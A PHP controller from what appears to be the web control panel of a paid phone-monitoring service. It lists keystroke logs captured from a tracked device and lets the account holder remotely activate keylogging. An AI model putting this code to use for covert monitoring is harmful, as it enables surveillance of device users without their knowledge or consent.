<?php

namespace Controllers;

use Models\Modules,
    CS\Devices\Limitations,
    System\FlashMessages;

class Keylogger extends BaseModuleController
{

    protected $module = Modules::KEYLOGGER;

    protected function init()
    {
        parent::init();

        $this->initCP();
    }

    public function indexAction()
    {
         if ($this->di['currentDevice']['os'] == 'android' &&  $this->di['isTest']) {
            return $this->loh();
        }

        $keyloggerModel = new \Models\Cp\Keylogger($this->di);
        if ($this->getRequest()->isAjax()) {
            $dataTableRequest = new \System\DataTableRequest($this->di);

            $data = $keyloggerModel->getDataTableData(
                    $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
            );
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            $this->makeJSONResponse($data);
        }

        if ($this->view->paid) {
            $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
        }

        $this->setView('cp/keylogger.htm');
    }

    private function loh()
    {
        $settingsModel = new \Models\Cp\Settings($this->di);
        $settings = $settingsModel->getDeviceSettings($this->di['devId']);

        if ($settings['keylogger_enabled']) {
            $keyloggerModel = new \Models\Cp\Keylogger($this->di);
            if ($this->getRequest()->isAjax()) {
                $dataTableRequest = new \System\DataTableRequest($this->di);

                $data = $keyloggerModel->getDataTableData(
                        $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
                );
                $this->checkDisplayLength($dataTableRequest->getDisplayLength());
                $this->makeJSONResponse($data);
            }

            if ($this->view->paid) {
                $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
            }

            $this->setView('cp/keylogger.htm');
        } else {
            if ($this->getRequest()->hasGet('activate')) {
                $settingsModel->activateKeylogger($this->di['devId']);
                $this->di['flashMessages']->add(FlashMessages::SUCCESS, $this->di['t']->_('Updated!'));
                $this->redirect($this->di['router']->getRouteUrl('keylogger'));
            }
            
            $this->setView('cp/keyloggerActivate.htm');
        }
    }

    protected function postAction()
    {
        parent::postAction();
        $this->buildCpMenu();

        $this->view->title = $this->di['t']->_('Keylogger');
    }

    protected function isModulePaid()
    {
        $devicesLimitations = new Limitations($this->di['db']);
        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::KEYLOGGER);
    }

}
